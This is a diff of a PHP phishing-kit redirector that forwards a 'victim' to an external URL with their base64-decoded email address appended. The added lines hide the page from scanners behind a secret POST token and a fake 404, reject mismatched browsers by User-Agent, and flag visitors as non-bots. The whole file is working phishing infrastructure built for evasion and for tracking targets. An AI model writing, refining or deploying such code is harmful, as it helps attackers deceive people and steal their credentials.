@@ -1,38 +1,49 @@
 <?php
+session_start();
+
+// Validate that the POST token exists and matches the stored session token.
+if (!isset($_POST['e84c04c00c8e6f1117a0c7c603adab81']) || $_POST['e84c04c00c8e6f1117a0c7c603adab81'] !== ($_SESSION['id'] ?? '')) {
+    http_response_code(404);
+    exit('Not Found');
+}
+
+// Verify that the browser making the request is the same as the one that started the session.
+$currentUserAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$storedUserAgent  = $_SESSION['user_agent'] ?? '';
+if ($storedUserAgent !== $currentUserAgent) {
+    http_response_code(403);
+    exit('Browser mismatch – untrusted access');
+}
+
+// Define the base redirect URL.
 $victim_redirect = "https://mac.sa.com/6?ai=xd";
 
-// Check if an "email" parameter is present in the URL
+// If an email parameter is provided in the URL, attempt to decode and validate it.
 if (isset($_GET['email'])) {
     $email = $_GET['email'];
 
-    // Try to decode the email assuming it might be base64 encoded
+    // Try to decode assuming the email might be Base64 encoded.
     $decoded_email = base64_decode($email, true);
-    // Validate the decoded email; if valid, use it
     if ($decoded_email !== false && filter_var($decoded_email, FILTER_VALIDATE_EMAIL)) {
         $email = $decoded_email;
     } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-        // If the plain text isn't a valid email either, clear it
+        // If neither decoded nor plain value is a valid email, ignore it.
         $email = '';
     }
 
-    // If we have a valid email, append it to the redirect URL
+    // Append the email to the redirect URL if valid.
     if (!empty($email)) {
-        // Determine the proper separator based on whether the URL already has query parameters
         $separator = (strpos($victim_redirect, '?') !== false) ? '&' : '?';
         $victim_redirect .= $separator . 'email=' . urlencode($email);
     }
 }
 
-$session = isset($_POST['e84c04c00c8e6f1117a0c7c603adab81']) ? $_POST['e84c04c00c8e6f1117a0c7c603adab81'] : '';
+// Clean up the session.
+session_destroy();
+session_start();
+$_SESSION['bot'] = false;
 
-if (!empty($session)) {
-    session_start();
-    session_destroy();
-    session_start();
-    $_SESSION['bot'] = false;
-    header("Location: " . $victim_redirect);
-    exit;
-} else {
-    http_response_code(404);
-}
+// Finally, perform the redirect.
+header("Location: " . $victim_redirect);
+exit();
 ?>
